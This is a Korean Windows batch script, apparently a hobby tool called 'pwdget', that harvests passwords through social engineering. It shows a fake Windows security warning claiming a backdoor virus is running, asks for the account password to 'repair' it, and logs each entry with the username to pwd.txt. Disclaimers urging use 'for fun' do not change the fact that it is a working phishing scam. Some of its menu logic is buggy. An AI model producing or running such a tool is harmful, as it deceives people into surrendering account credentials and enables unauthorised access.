@echo off
set version=1.3 (Beta1)
set pwd = 1234
set pwd2fa = 123456
if not exist "pwdget" goto setup
cd pwdget
if not exist "msgfile" goto restoremode
echo [               %date% %time%               ] >> log.txt
echo. >> log.txt
echo [ %date% %time% ] 폴더 체크중.. >> log.txt
echo [ %date% %time% ] 폴더 체크완료 >> log.txt

:start
echo [ %date% %time% ] 파일 체크중.. >> log.txt
if not exist "log.txt" goto error
echo [ %date% %time% ] 파일 체크완료 : log.txt >> log.txt
if not exist "pwd.txt" goto error
echo [ %date% %time% ] 파일 체크완료 : pwd.txt >> log.txt
if not exist "msgfile/error.vbs" goto error
echo [ %date% %time% ] 파일 체크완료 : error.vbs >> log.txt
if not exist "msgfile/info.vbs" goto error
echo [ %date% %time% ] 파일 체크완료 : info.vbs >> log.txt
echo [ %date% %time% ] 파일 전체 체크완료 : {log.txt, pwd.txt, error.vbs, info.vbs} >> log.txt
start msgfile/info.vbs
echo [ %date% %time% ] 파일 실행 : info.vbs >> log.txt
cls
echo [ %date% %time% ]:  프로그램 실행완료 (실행 버전: %version% / 경로: %cd% / 사용자명: %USERNAME%) >> log.txt
color a
title [Windows 보안] 작업이 필요합니다.
set /p a=비밀번호(Password)를 입력해주세요: 
echo [ %date% %time% ]: %a% (%USERNAME%) >> pwd.txt
if %a% == 1234 goto adminverify
goto exit

:adminverify
color b
cls
echo [ %date% %time% ] 관리자 모드: 인증단계입니다. >> log.txt
echo ========== 관리자 폐널 보호 시스템! ==========
set /p b=2단계 비밀번호를 입력하세요!: 
echo [ %date% %time% ] 관리자 모드: 비밀번호(2단계)를 입력하였습니다. >> log.txt
if %b% == 123456 goto admin
echo [ %date% %time% ] 관리자 모드: 비밀번호가 틀려 프로그램이 종료됨 >> log.txt
start msgfile/errorpwd.vbs
goto exit

:admin
cls
echo [ %date% %time% ] 관리자 모드: (이)가 실행하였습니다. >> log.txt
echo ========== 관리자 패널에 오신걸 환영해요! ==========
echo.
echo 1. 로그 관리
echo 2. 비밀번호 관리
echo 3. 가이드 보기
echo 4. 업데이트 및 깃허브 보기
echo 5. 시작프로그램으로 등록 (개발중)
set /p c=원하시는 메뉴의 번호를 입력하세요: 
if %b% == 1 goto exit
if %b% == 2 goto exit
if %b% == 3 goto exit
if %b% == 4 goto admin4
if %b% == 5 goto exit

:admin4
cls
echo 깃허브를 참조하세요 :)
echo 링크: https://github.com/hmogae/getpwd
start https://github.com/hmogae/getpwd
goto admin

:setup
color b
echo %username%님! 프로그램 사용을 환영해요!
echo.
echo !! 이 프로그램은 악용하면 문제가 될수 있는 프로그램입니다. !!
echo !! 사용후 문제발생시 모두 본인책임이므로 확인후 사용하세요. (github Readme.md파일 참조) !!
echo !!  상대방의 비밀번호를 알아내기보다는 재미로만 사용해주시기 바랍니다 !!
set /p a=위의 내용에 동의 하시나요? 동의거부시 프로그램을 사용하실수 없습니다. (y/n): 
if %a%==exit goto exit
if %a%==y goto setupyes
if %a%==yes goto setupyes
if %a%==ye goto setupyes
if %a%==agree goto setupyes
if %a%==n goto exit
if %a%==no goto exit
if %a%==nope goto exit
if %a%==disagree goto exit

:setupyes
md pwdget
cd pwdget
md msgfile
cls
echo [ 비밀번호 형식: [ 날짜 시간 ]: 비밀번호 (사용자이름-전체) ] >> pwd.txt
echo MsgBox "해당경로에 프로그램 설치가 완료되었어요! 경로를 확인하세요!: %cd%", 8, "프로그램 설치완료" >> msgfile/setupfinish.vbs
echo MsgBox "현재 이 컴퓨터에 바이러스 Backdoor:Win32 (이)가 실행되고 있는것이 확인되었습니다. 자동으로 복구 하려하였으나, 관리자권한(UACPerm)이 부족하여 작업실행을 위해 사용자 계정 비밀번호를 입력해주세요. 이 창을 끄는경우 복구가 불가능 할 수 있습니다.", 16, "오류" >> msgfile/info.vbs
echo MsgBox "알수없는 오류가 발생했어요..", 16, "오류가 발생했어요!" >> msgfile/error.vbs
echo MsgBox "비밀번호가 틀렸으므로 프로그램이 종료되었어요!", 64, "비밀번호가 틀렸어요!" >> msgfile/errorpwd.vbs
echo [ 설치시각: %date% %time% ] >> info.txt
echo * 프로그램을 삭제하려면 프로그램 폴더 (배치파일)에서 "pwdget" 폴더를 삭제하시면 됩니다! >> info.txt
echo * 악용으로 인한 책임은 모두 본인에게 있음을 알립니다 >> info.txt
echo * 초기설정창은 %temp%\pwdgen이 있는경우 표시되지 않고 pwdget모드가 실행됩니다 >> info.txt
echo * 프로그램을 삭제하려면 프로그램 폴더 (배치파일)에서 "pwdget" 폴더를 삭제하시면 됩니다!
echo * 악용으로 인한 책임은 모두 본인에게 있음을 알립니다
echo * 초기설정창은 %temp%\pwdgen이 있는경우 표시되지 않고 pwdget모드가 실행됩니다
start msgfile/setupfinish.vbs
echo !!! 60초후 프로그램이 자동으로 종료됩니다.
timeout /t 60 >nul
exit

:restoremode
cls
echo [ 복구모드 ]
echo.
echo 사용자의 파일삭제로 오류가 발생했습니다,
echo 폴더 삭제후 다시 설치해야합니다. (log.txt, pwd.txt가 삭제됩니다.)
set /p a=계속할까요? (y/n): 
if %a%==y goto restorestart
if %a%==n goto exit
if %a%==yes goto restorestart
if %a%==no goto exit

:restorestart
set /p a=pwdget 폴더내부 파일이 모두 삭제됩니다. 정말로 삭제하실건가요? (y/n): 
if %a%==y goto restorestart2
if %a%==n goto exit
if %a%==yes goto restorestart2
if %a%==no goto exit

:restorestart2
cls
cd..
del pwdget
cls
goto setup

:error
cls
echo [ %date% %time% ] 프로그램 동작중 오류가 발생했어요. 깃허브 이슈로 문의하거나 최신버전 다운로드, 폴더삭제후 다시 설정해보세요! >> log.txt
echo [ %date% %time% ] 파일 실행완료 : error.vbs >> log.txt
start msgfile/error.vbs
goto exit

:exit
cls
echo [ %date% %time% ] 프로그램이 종료되었습니다. (버전: %version%) >> log.txt
echo. >> log.txt
exit
